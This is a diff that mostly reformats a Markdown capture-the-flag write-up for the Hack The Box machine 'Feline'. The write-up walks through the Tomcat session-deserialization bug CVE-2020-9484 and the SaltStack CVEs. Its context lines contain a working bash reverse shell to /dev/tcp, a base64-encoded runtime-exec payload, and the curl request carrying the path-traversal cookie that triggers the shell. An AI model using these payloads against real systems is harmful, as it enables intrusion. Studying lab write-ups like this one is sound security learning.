@@ -1,6 +1,6 @@
 ![](feline_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -38,48 +38,48 @@ PORT     STATE SERVICE VERSION
 
 * notice one fixed issue
 
-__Fixed in Apache Tomcat 9.0.35__
+**Fixed in Apache Tomcat 9.0.35**
 
-* Important: Remote Code Execution via session persistence __[CVE-2020-9484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)__
+* Important: Remote Code Execution via session persistence **[CVE-2020-9484](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9484)**
 
-* and why this, because it's point clearly says that - __an attacker is able to control the contents and name of a file on the server__
+* and why this, because it's point clearly says that - **an attacker is able to control the contents and name of a file on the server**
 
-__vulnerability:__ Apache Tomcat RCE by deserialization, __[redtimmy.com Article](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)__
+**vulnerability:** Apache Tomcat RCE by deserialization, **[redtimmy.com Article](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)**
 
 ## Exploit surface
 
-__Prerequisites__
+**Prerequisites**
 
 1. The `PersistentManager` is enabled and it’s using a `FileStore`
-2. The attacker is able to upload a file with __arbitrary content__, has control over the filename and knows the location where it is uploaded
+2. The attacker is able to upload a file with **arbitrary content**, has control over the filename and knows the location where it is uploaded
 3. There are gadgets in the `classpath` that can be used for a Java deserialization attack
 
-__Attack__
+**Attack**
 
 using a specifically crafted request, the attacker will be able to trigger remote code execution via deserialization of the file under their control.
 
-__exploit__
+**exploit**
 
 * When Tomcat receives a HTTP request with a `JSESSIONID` cookie, it will ask the `Manager` to check if this session already exists. Because the attacker can control the value of `JSESSIONID` sent in the request, what would happen if he put something like `JSESSIONID=../../../../../../opt/samples/uploads/anything`
 
   * Tomcat requests the Manager to check if a session with session ID `../../../../../../opt/samples/uploads/anything` exists
   * It will first check if it has that session in memory.
-  * It does not. But the currently running Manager is a `PersistentManager`, so it will also check if it has the session on __disk__.
+  * It does not. But the currently running Manager is a `PersistentManager`, so it will also check if it has the session on **disk**.
   * It will check at location directory + sessionid + ".session", which evaluates to `./session/../../../../../../opt/samples/uploads/anything.session`
     * And here we need create create a malicious Java Runtime Environment serialized Object and upload as `.session` extention to exploit unsafe Java object deserialization vulnerability because when requesting it from `JSESSIONID` as cookie, `PersistentManager` check for session cookie in the disk and cookies are store with `.session` extention.
 
   * If the file exists, it will deserialize it and parse the session information from it
 
-__Tool: [ysoserial](https://github.com/frohoff/ysoserial):__ for generating payloads.
+**Tool: [ysoserial](https://github.com/frohoff/ysoserial):** for generating payloads.
 
 # User Exploit
 
-__Reverse_shell:__
+**Reverse_shell:**
 ```bash
 ❯ echo 'bash -i >& /dev/tcp/tun0/4141 0>&1' | base64
 ```
 
-__convert reverse shell into a java runtime executable:__
+**convert reverse shell into a java runtime executable:**
 online tool for this is [here](http://jackson-t.ca/runtime-exec-payloads.html)
 ```bash
 bash -c {echo,ZWNobyAnYmFzaCAtaSA+JiAvZGV2L3RjcC90dW4wLzQxNDEgMD4mMSc=}|{base64,-d}|{bash,-i}
@@ -112,7 +112,7 @@ listening on [any] 4141 ...
 ╰─❯ curl 'http://10.10.10.205:8080/upload.jsp' -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/duck"
 ```
 
-__Get tomcat shell__
+**Get tomcat shell**
 ```bash
 ❯ pwncat -lp 4141
 [21:36:26] received connection from 10.10.10.205:33382                        connect.py:255
@@ -142,18 +142,18 @@ LISTEN     0          4096                    127.0.0.1:36391              0.0.0
  
 ```
 
-* by default __saltstack__ run on port 4505,4506 
+* by default **saltstack** run on port 4505,4506 
 
-__Saltstack__ is Python-based, open-source software for event-driven IT automation, remote task execution, and configuration management.
+**Saltstack** is Python-based, open-source software for event-driven IT automation, remote task execution, and configuration management.
 
-__Found 2 CVEs__ -
+**Found 2 CVEs** -
 
 + Authentication bypass vulnerabilities (CVE-2020-11651)
 + Directory traversal vulnerabilities (CVE-2020-11652)
 
-__source: f-secure report:__ [SaltStack authorization bypass](https://labs.f-secure.com/advisories/saltstack-authorization-bypass/)
+**source: f-secure report:** [SaltStack authorization bypass](https://labs.f-secure.com/advisories/saltstack-authorization-bypass/)
 
-__PoC_Script:__ by [jasperla@github](https://github.com/jasperla/CVE-2020-11651-poc)
+**PoC_Script:** by [jasperla@github](https://github.com/jasperla/CVE-2020-11651-poc)
 
 *while testing this script find out that the script requires python salt module which is not installed in the box*
 ```python
@@ -165,7 +165,7 @@ ModuleNotFoundError: No module named 'salt'
 ```
 *so the script is not gonna work directly, First need to forward 4506 port in the local machine and install the salt module in my local machine.*
 
-__Port forwarding__ with [chisel](https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz)
+**Port forwarding** with [chisel](https://github.com/jpillora/chisel/releases/download/v1.7.3/chisel_1.7.3_linux_amd64.gz)
 
 # Privesc
 
@@ -241,6 +241,6 @@ LISTEN    0         128                   [::]:22                  [::]:*       
 
 ## Docker Exploit
 
-- [ ] TODO: __gaining host root access using docker socket__ *Machine Retired!*
+- [ ] TODO: **gaining host root access using docker socket** *Machine Retired!*
 
-__[ippsec solution](https://www.youtube.com/watch?v=2QdK7tQUFac&t=3530s)__
+**[ippsec solution](https://www.youtube.com/watch?v=2QdK7tQUFac&t=3530s)**
